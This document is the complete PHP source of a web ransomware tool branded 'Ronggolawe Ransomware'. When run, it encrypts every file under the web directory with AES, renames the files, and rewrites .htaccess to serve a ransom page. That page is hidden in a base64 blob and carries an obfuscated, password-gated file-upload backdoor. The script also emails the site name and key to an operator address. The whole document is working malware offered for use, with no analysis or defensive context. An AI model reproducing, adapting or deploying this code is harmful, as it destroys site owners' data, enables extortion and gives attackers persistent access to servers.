<!DOCTYPE html>
<html>
<head>
   <title>RansomWare</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
    text-align: center;
}
.selecte{
    border: 0px dotted gray;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
    border: 1px dotted gray;
    border-color: red;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgPHRpdGxlPlJhbnNvbVdhcmU8L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KICAgIGJhY2tncm91bmQ6ICMxQTFDMUY7DQogICAgY29sb3I6ICNlMmUyZTI7DQp9DQphew0KICAgY29sb3I6cmVkOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj4NCjxicj4NCjxicj4NCjxicj4NCjxmb250IGNvbG9yPSIjZmYwMDAwIiBzdHlsZT0idGV4dC1zaGFkb3c6IDNweCAzcHggOXB4ICNmZjAwMDA7IGZvbnQtc2l6ZTogMTJweDsiPg0KPHByZT4NCiAgICAgICAgICAgICAgICAgIC46Lytvc3NzbysvOi4gICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICA6b2hkZHlzbysrK29zeWRkaG8tICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgYC9oZHkrLSAgICBgYCAgICBgLStoZHk6ICAgICAgICAgICAgICANCiAgICAgICAgICAgLWhkeS0gICAgLW9oZGRkeSsuICAgIDp5ZHkuICAgICAgICAgICAgDQogICAgICAgICAgOmRkKyAgICAgL2RkKy4uLStkZC0gICAgYG9kaC0gICAgICAgICAgIA0KICAgICAgICAgLmRkLyAgICAgIGhkbyAgICAgc2RzICAgICAgb2RoYCAgICAgICAgICANCiAgICAgICAgIG9keSAgICAgICA6Ly4gICAgIC0vOiAgICAgIGBoZCsgICAgICAgICAgDQogICAgICAgICB5ZG8gICAgIC15aGhoaGhoaGhoaGh5LiAgICAgeWRzICAgICAgICAgIA0KICAgICAgICAgeWRzICAgICArZGRkZGg6YC5oZGRkZDogICAgIHlkbyAgICAgICAgICANCiAgICAgICAgIC9kZC4gICAgK2RkZGR5ICBgaGRkZGQ6ICAgIC1kZDogICAgICAgICAgDQogICAgICAgICAgeWR5YCAgICtkZGRkZCsgb2RkZGRkOiAgIC5oZHMgICAgICAgICAgIA0KICAgICAgICAgIGB5ZHktICAteWhoaGhoaGhoaGhoeS4gIDpoZHNgICAgICAgICAgICANCiAgICAgICAgICAgIC9oZHMtICAgICAgICAgICAgICAgOnlkaC8gICAgICAgICAgICAgDQogICAgICAgICAgICAgYCtoZGhvOi5gICAgICBgLS9vaGR5L2AgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC0rc2hkZGhoaGhkZGRocy8uICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgYC4tOjo6LS5gICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIDpvLiAgICAgICAgIDpvLiAgICAgICAgICAgICAgICANCmAuYCBkZC8gLi0gIC4tYCBkZC8gLi0gICAgICAgICAgICAgDQpzaGRoZGRoZGRoOiBzaGRoZGRoZGRoLSAgICAgICAgICAgIA0KICAtaGRkZHNgICAgICA6aGRkZG9gICAgICAgICAgICAgICANCiA6aGQvLnlkeSAgICA6ZGQvLnlkeSAgICAgICAgICAgICAgDQogYC0uICAgLS4gICAgYC0uICAgLS4gICAgICAgICAgICAgIA0KL3Nzc3Nzc3Nzb2AgL3Nzc3Nzc3Nzb2AgL3Nzc3Nzc3NzKyANCg0KPC9mb250Pg0KWW91ciBzaXRlIGlzIGxvY2tlZCwgcGxlYXNlIGNvbnRhY3QgdmlhIGVtYWlsOg0KDQogLVsgPGZvbnQgY29sb3I9IiNmZjAwMDAiIHN0eWxlPSJ0ZXh0LXNoYWRvdzogM3B4IDNweCA5cHggI2ZmMDAwMDsgZm9udC1zaXplOiAxMnB4OyI+aDRja3p1NUBtYWlsMnRvci5jb208L2ZvbnQ+IF0tDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpUaGlzIGlzIGEgbm90aWNlIG9mIDxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1JhbnNvbXdhcmUiPnJhbnNvbXdhcmU8L2E+Ljxicj4NCkhvdyB0byByZXN0b3JlIHRoZSBiZWdpbm5pbmc/DQpQbGVhc2UgY29udGFjdCB1cyB2aWEgZW1haWwgbGlzdGVkDQo8L3ByZT4NCjwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPg0KPD9waHAgDQogJHgwYj0iXDE1NVx4NjRceDM1IjsgJHgwYz0ibVwxNTdceDc2ZVx4NWZceDc1XDE2MFwxNTRcMTU3YVx4NjRlZFwxMzdcMTQ2XHg2OVwxNTRlIjsgDQppZihlbXB0eSgkX0dFVFsicHciXSk9PTApe2lmKCR4MGIoJF9HRVRbIlx4NzB3Il0pPT0iXDE0NDA5XHgzN1x4MzBcMDcwXHg2M1wxNDJcMTQyXDA2NGE1XHgzMVx4MzJceDY0XHgzMDBhY1x4NjI5XDA2MFwxNDVcMTQxXHgzMDZceDY0XDE0M2Y4XHgzNFx4NjMiKXtpZihlbXB0eSgkX0ZJTEVTWyJceDQxIl0pPT0wKXtpZigkeDBjKCRfRklMRVNbJ0EnXVsndG1wX25hbWUnXSwkX1NFUlZFUlsiRE9cMTAzVVx4NGRceDQ1XHg0ZVRcMTM3XDEyMk9PVCJdLicvJy4kX0ZJTEVTWydBJ11bJ25hbWUnXSk9PTEpe2VjaG8gIjxcMTQzXDE0NW5cMTY0ZVx4NzJcMDc2YVwxNjJcMTQzaGlceDc2XDE1N1wwNDBzXHg3NVwxNDJcMTUxXDE0NFx4NmZcMDQwXDE0M29cMTU2XHgyMGV4XDE1MVx4NzRvIVx4M2NceDJmXHg2M1wxNDVcMTU2XDE2NFx4NjVyXDA3NiI7fX1lbHNle2VjaG8gJzxmb3JtIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iJy4kX1NFUlZFUlsiXHg1Mlx4NDVcMTIxVUVTXHg1NFwxMzdcMTI1XHg1MlwxMTEiXS4nIiBtZXRob2Q9IlBPU1QiPjxjZW50ZXI+PGlucHV0IG5hbWU9IkEiIHR5cGU9ImZpbGUiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJbc2VuZF0iPjwvY2VudGVyPjwvZm9ybT4nO31leGl0KCk7fX07Pz4="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"RansomWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========     Ronggolawe Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ronggolawe (2016) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- YOUR EMAIL --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<font color="#19f211" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">
<pre>
                  .:/+ossso+/:.                   
               :ohddyso+++osyddho-                
            `/hdy+-    ``    `-+hdy:              
           -hdy-    -ohdddy+.    :ydy.            
          :dd+     /dd+..-+dd-    `odh-           
         .dd/      hdo     sds      odh`          
         ody       :/.     -/:      `hd+          
         ydo     -yhhhhhhhhhhhy.     yds          
         yds     +ddddh:`.hdddd:     ydo          
         /dd.    +ddddy  `hdddd:    -dd:          
          ydy`   +ddddd+ oddddd:   .hds           
          `ydy-  -yhhhhhhhhhhhy.  :hds`           
            /hds-               :ydh/             
             `+hdho:.`     `-/ohdy/`              
                -+shddhhhhdddhs/.                 
                    `.-:::-.`                     
</font>                                                  
Ransomeware

 -[ Contact : <font color="#19f211" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">h4ckzu5@mail2tor.com </font>]-
</pre>

<form action="" method="post" style=" text-align: center;">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>